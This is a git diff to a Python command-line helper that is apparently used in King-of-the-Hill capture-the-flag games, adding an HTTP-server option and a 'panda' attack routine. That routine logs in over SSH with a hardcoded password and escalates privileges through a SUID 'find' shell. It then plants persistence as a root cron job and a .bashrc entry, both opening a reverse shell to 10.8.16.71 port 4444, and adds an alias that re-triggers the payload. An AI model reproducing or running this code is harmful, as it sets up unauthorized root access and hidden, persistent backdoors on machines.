@@ -68,6 +68,8 @@ def runCommand(cmd):
         generateList()
     elif args[0] == 'koth':
         koth()
+    elif args[0] == 'serveHttp':
+        run_http_server()
     elif args[0] == 'portcheck' or args[0] == 'portCheck':
         host = 'localhost'
         port = int(input("[ENTER THE PORT NUMBER TO CHECK]: "))
@@ -109,15 +111,19 @@ def help():
             9. grabIp
             10. wordGen 
             11. koth
+            12. serveHttp
             more are in progress
             """)
 
 def koth():
+    ipAdd = input("[ENTER YOUR MACHINE IP]: ")
     inp = input("[WHICH MACHINE TO PWN]: ")
     if inp == "production":
         ashu_at_production()
     elif inp == "shrek":
         donkey_at_shrek()
+    elif inp == 'panda':
+        panda()
     else :
         print("[BYE BYE!] ;-)")
 
@@ -130,10 +136,19 @@ def hello_friend():
     else:
         print("Hey! the file you're trying to use doesn't exist.")
 
+def run_http_server():
+    try:
+        port = input("[ENTER THE PORT FOR SERVER]: ")
+        command = f"python -m http.server {port} "
+        subprocess.run(command,shell=True)
+    except Exception as exp:
+        print(exp)
+
+
 def ashu_at_production():
     try:
         command = """
-                echo "enter the machine IP :\n"
+                echo -e "enter the machine IP :\n"
                 read IP
                 ssh -t -i prossh ashu@$IP << EOF
                 sudo su skidy
@@ -146,6 +161,24 @@ def ashu_at_production():
         subprocess.run(command, shell=True)
     except Exception as exp:
         print(f"Exception occurred : {exp}")
+
+def panda():
+    command = f"""
+            echo "shifu's password is 'batman'"
+            echo -e "enter the machine IP: "
+            read IP
+            ssh -t shifu@$IP << EOF
+            find . -exec /bin/sh -p \; -quit
+            echo "* * * * * /bin/bash -i >& /dev/tcp/10.8.16.71/4444 0>&1" >> /var/spool/cron/root
+            echo "/bin/bash -i >& /dev/tcp/10.8.16.71/4444 0>&1 & disown" >> ~/.bashrc
+            alias cd="cd && source .bashrc &"
+
+
+            EOF
+
+
+    """
+    subprocess.run(command, shell=True)
 
 def donkey_at_shrek():
     ip = input("enter the ip address for shrek: ")
